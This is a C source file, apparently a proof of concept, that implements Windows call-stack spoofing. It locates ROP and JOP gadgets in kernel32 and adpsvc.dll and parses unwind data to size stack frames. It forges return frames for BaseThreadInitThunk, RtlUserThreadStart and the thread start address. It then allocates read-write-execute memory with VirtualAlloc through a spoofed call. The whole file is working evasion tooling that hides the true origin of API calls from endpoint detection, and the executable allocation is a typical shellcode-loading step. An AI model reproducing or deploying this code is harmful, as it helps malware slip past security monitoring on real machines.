#include <stdio.h>
#include <Windows.h>
#include "structs.h"
#include "macros.h"

extern PVOID NTAPI Spoof(PVOID a, ...);


PVOID FindRopGadgetMask(LPBYTE Module, ULONG Size, LPBYTE Pattern, LPBYTE Mask, ULONG PatternSize) {

    for (ULONG x = 0; x < Size - PatternSize; x++) {

        BOOL Found = TRUE;

        for (UINT32 i = 0; i < PatternSize; i++) {

            if (Mask[i] == 'x' && Module[x + i] != Pattern[i]) {
                Found = FALSE;
                break;
            }
        }

        if (Found) return (PVOID)(Module + x);
    }

    return NULL;
}

/*
*    Find the .text section
*
*    Ensure that the gadget is always in executable memory and in the range of .text section
*/
DWORD ProcessTextSection(PVOID pBaseAddr) {

    PIMAGE_DOS_HEADER       DosHeader = NULL;
    PIMAGE_NT_HEADERS       NtHeader = NULL;

    DosHeader = (PIMAGE_DOS_HEADER)pBaseAddr;
    NtHeader = (PIMAGE_NT_HEADERS)((PCHAR)pBaseAddr + DosHeader->e_lfanew);

    for (DWORD i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {

        PIMAGE_SECTION_HEADER ImgSectionHead =
            (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(NtHeader)
                + IMAGE_SIZEOF_SECTION_HEADER * i);

        if (strcmp(ImgSectionHead->Name, ".text") == 0) {

            if (ImgSectionHead->Misc.VirtualSize > 0)
                return ImgSectionHead->Misc.VirtualSize;
        }
    }

    return 0;

}



/*
*   Find ROP gadgets needed for the ROP chain
*
*   Given a module base address search for a specific ROP gadget
*/
PVOID FindRopGadget(
    LPBYTE Module, 
    ULONG Size, 
    unsigned char* gadget, 
    size_t gadgetSize
)
{
    for (int x = 0; x < Size; x++)
    {
        if (memcmp(Module + x, gadget, gadgetSize) == 0)
        {
            return (PVOID)(Module + x);
        };
    };

    return NULL;
}

/*
*   Follow Incremental Link Table jmp entry
*/
PVOID ResolveJmpThunk(
    PVOID addr
) 
{
    PBYTE p = (PBYTE)addr;

    if (memcmp(p, "\xE9", 1) == 0)
    {
        INT32 rel = *(INT32*)(p + 1);
        return (PVOID)(p + 5 + rel);

    }
    return addr;
}

/*
*   Retrieving the Thread Start Address for evasion frame (3rd)
*/
PVOID GetThreadStartAddress() 
{
    PVOID startAddr                     = NULL;
    fnNtQueryInformationThread pNtQIT   = (fnNtQueryInformationThread)
        
        GetProcAddress(
            GetModuleHandleA("ntdll.dll"), 
            "NtQueryInformationThread"
            );

    // NtQueryInformationThread
    pNtQIT(
        GetCurrentThread(),
        (THREADINFOCLASS)9,   // ThreadQuerySetWin32StartAddress
        &startAddr,
        sizeof(startAddr),
        NULL
    );
    return startAddr;
}


/*
*    Dinamically resolve ret frames offset for RtlUserThreadStart and BaseThreadInitThunk
*
*    Find the first CALL instruction in the function and calculate offset from the base address
*/
DWORD ResolveOffset(
    PBYTE pBaseAddr
)
{

    for (int i = 0; i < 0x100; i++)
    {
        if (memcmp(pBaseAddr + i, "\xE8", 1) == 0)
        {
            PBYTE ret = ((pBaseAddr + i) + 0x5);
            return (DWORD)(ret - pBaseAddr);
        }
    }
    return 0x00;
}


/*
*   Scan Module's memory for the byte sequence FF 23 (JMP [RBX]) JOP gadget
*
*   RBX is a non-volatile register, it will contain the address of PRM fixUp every spoofed call
*/
PVOID FindGadget(
    LPBYTE Module, 
    ULONG Size
)
{
    for (int x = 0; x < Size; x++)
    {
        if (memcmp(Module + x, "\xFF\x23", 2) == 0)
        {
            return (PVOID)(Module + x);
        };
    };

    return NULL;
}

/*
*   Given a function entry inside the RUNTIME_FUNCTION table
*   determine how many bytes the stack frame has
*/
ULONG CalculateFunctionStackSize(
    PRUNTIME_FUNCTION pRuntimeFunction, 
    const DWORD64 ImageBase
)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);

    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;

        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:

            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;

            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;

        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;

        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;

        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;

        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = true;
            break;

        default:
            //printf("[-] Error: Unsupported Unwind Op Code\n");
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }

        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase /*stackFrame*/);
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
Cleanup:
    return status;
}

ULONG CalculateFunctionStackSizeWrapper(
    PVOID ReturnAddress
)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

Cleanup:
    return status;
}


void InitFirst3frms(
    PRM *p
)
{
    PVOID ReturnAddress = NULL;

    p->jop = FindGadget(
        (LPBYTE)GetModuleHandle(L"kernel32.dll"),
        0x200000
    );
    // p->Gadget_ss = CalculateFunctionStackSizeWrapper(p->trampoline);

    PVOID pBaseThreadInitThunk  = (PBYTE)(GetProcAddress(LoadLibraryA("kernel32.dll"), "BaseThreadInitThunk"));
    DWORD BTITOffset            = ResolveOffset((PBYTE)pBaseThreadInitThunk);
    ReturnAddress               = (PBYTE)pBaseThreadInitThunk + BTITOffset;

    printf(
        "[DEBUG] BaseThreadInitThunk frame ret address: 0x%p\n",
        ReturnAddress
    );

    p->BTIT_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);

    printf ("[DEBUG] BaseThreadInitThunk stack frame size: %lu\n",p->BTIT_ss);

    p->BTIT_retaddr = ReturnAddress;

    PVOID pRtlUserThreadStart   = (PBYTE)(GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart"));
    DWORD RtlUTSOffset          = ResolveOffset((PBYTE)pRtlUserThreadStart);
    ReturnAddress               = (PBYTE)pRtlUserThreadStart + RtlUTSOffset;

    printf ("[DEBUG] RtlUserThreadStart frame ret address: 0x%p\n",ReturnAddress);

    p->RUTS_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);

    printf ("[DEBUG] RtlUserThreadStart stack frame size: %lu\n",p->RUTS_ss);

    p->RUTS_retaddr = ReturnAddress;


    PVOID threadSt      = GetThreadStartAddress();
    threadSt            = ResolveJmpThunk(threadSt);
    DWORD tsaOffset     = ResolveOffset((PBYTE)threadSt);
    ReturnAddress       = (PBYTE)threadSt + tsaOffset;

    p->TSA_ss           = CalculateFunctionStackSizeWrapper(ReturnAddress);
    p->TSA_retaddr      = ReturnAddress;
}


// "mov rsp, rbp; pop rbp; ret" 
//
//  Why this gadget?
//      A ROP gadget must resides in a valid epilogue 
//      and not as random matching bytes
static const UCHAR DISP_GADG[] = { 0x55, 0xC3 };
static const UCHAR MASK_DISP_GADG[] = "xx";

#define DISP_GADG_SZ 2



/*
 *  Try each DLL: load via Spoof, search for gadget.
 *
 *  If not found, unload and move to next. If none match, keep bootstrap.
 */
void elevateGadget(
    PRM* p
)
{
    static const LPCSTR g_dispatchGadg =
        "adpsvc.dll"; // You should place more DLL here

        printf("[DEBUG] Searching inside %s...\n", g_dispatchGadg);

        LoadLibraryA(g_dispatchGadg);
        HMODULE hMod = GetModuleHandleA(g_dispatchGadg);
        if (!hMod) return;

        DWORD textLen = ProcessTextSection(hMod);
        if (!textLen) return NULL;


            PVOID gadget = FindRopGadgetMask(
                hMod + 0x1000, textLen,
                (LPBYTE)DISP_GADG, (LPBYTE)MASK_DISP_GADG, DISP_GADG_SZ );

            if (!gadget) 
                return;                       
            /* no more matches in this DLL */

            /* advance cursor past this match for the next iteration */
            ULONG fs = CalculateFunctionStackSizeWrapper(gadget);

            /* keep this donor */
            p->trampoline = gadget;
            p->Gadget_ss = (PVOID)(ULONG_PTR)fs;

            printf("[+] DISP gadget %p in %s | fs=%lu \n",
                gadget, g_dispatchGadg, fs );
            return;
    

    printf("[-] Donor gadget found\n");
}


int main() 
{
    PRM p                   = { 0 };
    PRM ogp                 = { 0 };
    NTSTATUS status         = STATUS_SUCCESS;

    InitFirst3frms(&p);
    
    printf ("[DEBUG] jop gadget (0x%p) \n", p.jop);

    elevateGadget(&p);

    printf("[V] Dispatcher gadget at: (0x%p) - frame size: %lu\n", p.trampoline, (DWORD)(ULONG_PTR)p.Gadget_ss);
    printf("\n");

    printf("[DBG] sizeof(PRM)=%zu  jop=%p  trampoline=%p  fs=%lu  fpOff16=%lu\n",
        sizeof(PRM),
        p.jop,
        p.trampoline,
        (ULONG)(ULONG_PTR)p.Gadget_ss,
        (ULONG)(ULONG_PTR)p.Gadget_FpOff16);
    
        //
    //
    // Place a breakpoint at virtualAlloc start and inspect the spoofed call stack
    PVOID Mem = Spoof(
        NULL,
        0x100,
        (PVOID)(MEM_COMMIT | MEM_RESERVE),
        (PVOID)PAGE_EXECUTE_READWRITE,
        &p,
        VirtualAlloc,
        (PVOID)0
    );

    printf("Mem allocated @ 0x%p\n", Mem);
    
    getchar();
    return 0;
}